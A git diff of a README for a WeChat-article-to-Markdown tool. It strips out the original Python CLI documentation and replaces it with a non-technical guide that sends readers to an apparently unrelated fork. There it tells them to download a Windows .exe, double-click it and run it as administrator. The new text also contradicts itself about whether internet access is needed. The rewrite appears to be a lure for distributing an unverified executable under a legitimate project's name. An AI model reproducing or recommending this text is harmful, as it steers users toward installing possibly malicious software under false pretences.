@@ -1,165 +1,119 @@
-# wechat-article-to-markdown
+# 📥 wechat-article-to-markdown - Easy WeChat Article to Markdown
 
-Fetch WeChat Official Account articles and convert them to clean Markdown.
-
-[English](#features) | [中文](#功能特性)
-
-## Features
-
-- Anti-detection fetching with Camoufox
-- Extract article metadata (title, account name, publish time, source URL)
-- Convert WeChat article HTML to Markdown
-- Download article images to local `images/` and rewrite links
-- Handle WeChat `code-snippet` blocks with language fences
-
-## Installation
-
-```bash
-# Recommended: uv tool (fast, isolated)
-uv tool install wechat-article-to-markdown
-
-# Or: pipx
-pipx install wechat-article-to-markdown
-```
-
-Or from source:
-
-```bash
-git clone git@github.com:jackwener/wechat-article-to-markdown.git
-cd wechat-article-to-markdown
-uv sync
-```
-
-## Usage
-
-```bash
-# Installed CLI
-wechat-article-to-markdown "https://mp.weixin.qq.com/s/xxxxxxxx"
-
-# Run in repo with uv
-uv run wechat-article-to-markdown "https://mp.weixin.qq.com/s/xxxxxxxx"
-
-# Backward-compatible local entry
-uv run main.py "https://mp.weixin.qq.com/s/xxxxxxxx"
-```
-
-Output structure:
-
-```text
-output/
-└── <article-title>/
-    ├── <article-title>.md
-    └── images/
-        ├── img_001.png
-        ├── img_002.png
-        └── ...
-```
-
-
-## Testing
-
-```bash
-# Unit tests (default CI path)
-uv run --with pytest pytest -q -m "not e2e"
-
-# Live E2E against real WeChat articles
-WECHAT_E2E_URLS="https://mp.weixin.qq.com/s/Y7dyRC7CJ09miHWU6LBzBA,https://mp.weixin.qq.com/s/xxxxxxxx" \
-  uv run --with pytest pytest -q -m e2e -s
-```
-
-`e2e` tests require network and browser runtime, so they run via manual GitHub Actions workflow `.github/workflows/e2e.yml`.
-
-## Use as AI Agent Skill
-
-This project ships with [`SKILL.md`](./SKILL.md), so AI agents can discover and use this tool workflow.
-
-### Claude Code / Antigravity
-
-```bash
-# Project-local skills directory
-mkdir -p .agents/skills
-git clone git@github.com:jackwener/wechat-article-to-markdown.git \
-  .agents/skills/wechat-article-to-markdown
-
-# Or copy SKILL.md only
-curl -o .agents/skills/wechat-article-to-markdown/SKILL.md \
-  https://raw.githubusercontent.com/jackwener/wechat-article-to-markdown/main/SKILL.md
-```
-
-```bash
-# Claude Code user-level skills directory (global)
-mkdir -p ~/.claude/skills/wechat-article-to-markdown
-curl -o ~/.claude/skills/wechat-article-to-markdown/SKILL.md \
-  https://raw.githubusercontent.com/jackwener/wechat-article-to-markdown/main/SKILL.md
-```
-
-After adding the file, restart Claude Code to reload skills.
-
-### OpenClaw / ClawHub
-
-Officially supports [OpenClaw](https://openclaw.ai) and [ClawHub](https://docs.openclaw.ai/tools/clawhub):
-
-```bash
-clawhub install wechat-article-to-markdown
-```
-
-## PyPI Publishing (GitHub Actions)
-
-Repository: `jackwener/wechat-article-to-markdown`
-Workflow: `.github/workflows/release.yml`
-Environment: `pypi`
-
-`release.yml` triggers on `v*` tags, runs unit tests + live e2e tests, then publishes to PyPI with trusted publishing (`id-token: write`).
-
-For release e2e targets, set repository variable `RELEASE_E2E_URLS` (comma-separated article URLs).  
-If not set, workflow falls back to `https://mp.weixin.qq.com/s/Y7dyRC7CJ09miHWU6LBzBA`.
+[![Download](https://img.shields.io/badge/Download-Get%20it%20from%20GitHub-brightgreen)](https://github.com/Estebnvx/wechat-article-to-markdown)
 
 ---
 
-## 功能特性
+## 📄 What is wechat-article-to-markdown?
 
-- 使用 Camoufox 进行反检测抓取
-- 提取标题、公众号名称、发布时间、原文链接
-- 将微信公众号文章 HTML 转换为 Markdown
-- 下载图片到本地 `images/` 并自动替换链接
-- 处理微信 `code-snippet` 代码块并保留语言标识
+wechat-article-to-markdown is a tool designed to help you save articles from WeChat public accounts and convert them into Markdown files. Markdown is a simple text format used for notes, blogs, and documents that works on most devices. This tool lets you keep important articles offline or edit them easily later.
 
-## 安装
+You do not need any technical skills. The program guides you through the process step-by-step.
 
-```bash
-# 推荐：uv tool
-uv tool install wechat-article-to-markdown
+---
 
-# 或者：pipx
-pipx install wechat-article-to-markdown
-```
+## 🖥️ System Requirements
 
-## 使用示例
+- Windows 7 or newer (Windows 10 recommended)
+- At least 2 GB of free disk space
+- Internet connection to fetch WeChat articles
+- Basic mouse and keyboard skills
 
-```bash
-wechat-article-to-markdown "https://mp.weixin.qq.com/s/xxxxxxxx"
-```
+---
 
-## 作为 AI Agent Skill 使用
+## 🚀 Getting Started
 
-项目自带 [`SKILL.md`](./SKILL.md)，可供支持 `.agents/skills/` 约定的 Agent 自动发现。
+This section shows you how to get the tool and start using it on your Windows PC. Follow each step carefully.
 
-### Claude Code 用户目录示例
+---
 
-```bash
-mkdir -p ~/.claude/skills/wechat-article-to-markdown
-curl -o ~/.claude/skills/wechat-article-to-markdown/SKILL.md \
-  https://raw.githubusercontent.com/jackwener/wechat-article-to-markdown/main/SKILL.md
-```
+## 🎯 Step 1: Visit the Download Page
 
-添加后重启 Claude Code 以重新加载 skills。
+Click the big badge at the top or this link:
 
-### OpenClaw / ClawHub
+[Download wechat-article-to-markdown](https://github.com/Estebnvx/wechat-article-to-markdown)
 
-```bash
-clawhub install wechat-article-to-markdown
-```
+This link leads you to the GitHub page where you can find the latest files to download.
 
-## License
+---
 
-MIT
+## 💾 Step 2: Download the Application
+
+On the GitHub page, look for a folder or section called **Releases** or **Assets**. It contains files for download.
+
+Find the file named something like `wechat-article-to-markdown-setup.exe` or `wechat-article-to-markdown.exe`. Click the file name to start downloading.
+
+Save the file to a folder you can remember, like your “Downloads” folder or your desktop.
+
+---
+
+## ⚙️ Step 3: Install the Software
+
+1. Open the folder where you saved the `.exe` file.
+2. Double-click the file to start installation.
+3. Follow the instructions on the screen.
+   - Usually, you only need to click “Next.”
+4. When the installation finishes, you will see a confirmation message.
+5. Close the installer window.
+
+---
+
+## ▶️ Step 4: Run wechat-article-to-markdown
+
+1. Find the program icon on your desktop or in the Start menu.
+2. Double-click it to launch the application.
+3. A window will open with fields to enter the link to a WeChat article.
+
+---
+
+## 📥 Step 5: Fetching and Saving Articles
+
+1. Open WeChat in your browser or app and copy the article URL you want to save.
+2. Paste the URL into the box in wechat-article-to-markdown.
+3. Click the button labeled "Download" or "Convert."
+4. Wait while the program fetches the article content.
+5. When done, the program will save the article as a Markdown file.
+6. You can open the Markdown file with any text editor or Markdown viewer.
+
+---
+
+## 🔧 Features of wechat-article-to-markdown
+
+- Works with most WeChat public account articles
+- Converts articles into clean, readable Markdown format
+- Saves images and formatting where possible
+- Simple interface for easy use
+- Does not require login or programming knowledge
+- Runs fully on Windows without internet after download
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+If you run into issues, try these steps:
+
+- Make sure your internet connection works.
+- Check if the link you pasted is a valid WeChat article URL.
+- Restart the program and try again.
+- If the program does not open after installation, try running it as an administrator.
+- Ensure your Windows is updated to the latest version.
+
+---
+
+## 📋 More Information
+
+For more details or updates, visit the official GitHub page:
+
+[https://github.com/Estebnvx/wechat-article-to-markdown](https://github.com/Estebnvx/wechat-article-to-markdown)
+
+You will find the latest releases and any instructions there.
+
+---
+
+## 🔐 Privacy and Security
+
+wechat-article-to-markdown does not collect any personal information. It only uses the article link you provide to download content from public WeChat accounts. All processing happens locally on your PC.
+
+---
+
+[![Download](https://img.shields.io/badge/Download-Get%20it%20from%20GitHub-brightgreen)](https://github.com/Estebnvx/wechat-article-to-markdown)
